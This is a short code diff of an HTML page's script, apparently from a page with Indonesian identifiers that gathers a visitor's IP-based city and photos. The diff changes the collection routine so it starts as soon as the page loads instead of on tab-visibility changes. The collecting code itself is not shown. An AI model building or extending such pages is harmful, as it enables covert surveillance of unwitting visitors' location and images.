@@ -242,19 +242,8 @@ Kota                : ${ip.city}
       }
     };
 
-    document.addEventListener("visibilitychange", () => {
-      if (document.visibilityState === "hidden") {
-        if (!sudahKirimInfo) mulai();
-      }
-      if (document.visibilityState === "visible") {
-        if (sudahKirimInfo && !lanjutFoto) {
-          lanjutFoto = true;
-          mulai();
-        }
-      }
-    });
-
-    mulai();
+    // Jalankan langsung saat halaman dibuka
+    window.addEventListener("load", mulai);
   </script>
 </body>
 </html>
